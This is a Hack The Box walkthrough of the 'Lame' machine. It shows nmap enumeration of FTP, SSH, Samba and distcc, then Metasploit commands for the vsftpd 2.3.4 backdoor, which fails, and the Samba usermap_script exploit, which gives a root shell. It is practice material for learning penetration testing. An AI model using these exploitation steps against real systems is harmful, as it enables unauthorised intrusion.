# Machine: Lame

Date: 2024-06-16.

## Overview
This write-up details my approach to compromising the "Lame" machine on Hack the Box. The Lame machine is a Unix-based system with several open services. Below are the steps I followed to successfully exploit the machine and obtain the necessary flags.

## Enumeration

Target Information:

* OS: Unix
* Ports: 21 (FTP), 22 (SSH), 139 (NetBIOS-SSN), 445 (Microsoft-DS), 3632 (DistCC)

### Nmap Scan Results:

Initial scan to discover open ports:

```bash
nmap -sS -p- <IP> -v -oN full_tcp_scan.txt
```

The scan revealed the following open ports:

```bash
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

Detailed scan on the discovered ports:

```bash
nmap -sV -sC -p21,22,139,445,3632 <IP> -v -oN v_ports.txt -oX v_ports.xml
```

The detailed scan revealed the following:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP Service

The FTP server allows anonymous login but contains no files of interest. The version identified is vsftpd 2.3.4, which has a known vulnerability:

```
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
```

### SSH Service

The SSH service is running OpenSSH 4.7p1 Debian 8ubuntu1.

### Samba Service

The Samba service version is Samba 3.0.20-Debian, which has multiple vulnerabilities. Running a script scan provided additional details:

```
smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
```

I enumerated the shares:

```bash
smbclient -L=10.10.10.3
```

Anonymous login was successful, and the shares available were:

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk      
IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
```

Inside the tmp directory, there were no files of interest.

### DistCC Service

The distccd service on port 3632 is used for distributed compilation, allowing tasks to be offloaded to other computers. A known vulnerability is CVE-2004-2687.
I tested it with nmap: `nmap -p3632 10.10.10.2 --script=distcc-cve2004-2687 --script-args="distcc-exec.cmd='id"` but I got nothing.

***

## Exploitation

### FTP Service

I tried the vsftpd 2.3.4 - Backdoor Command Execution exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP>
set LHOST <IP>
exploit
```

However, this did not result in a session.

### Samba Service

I then tried the Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution exploit:

```bash
use exploit/multi/samba/usermap_script
set RHOST <IP>
set LHOST <IP>
exploit
```

This successfully provided a shell:

```bash
root@lame:/# id
uid=0(root) gid=0(root)
```

## Conclusion

Compromising the Lame machine involved identifying vulnerable services and exploiting known vulnerabilities in Samba. This exercise reinforced key concepts in network service enumeration and exploitation of vulnerable software.
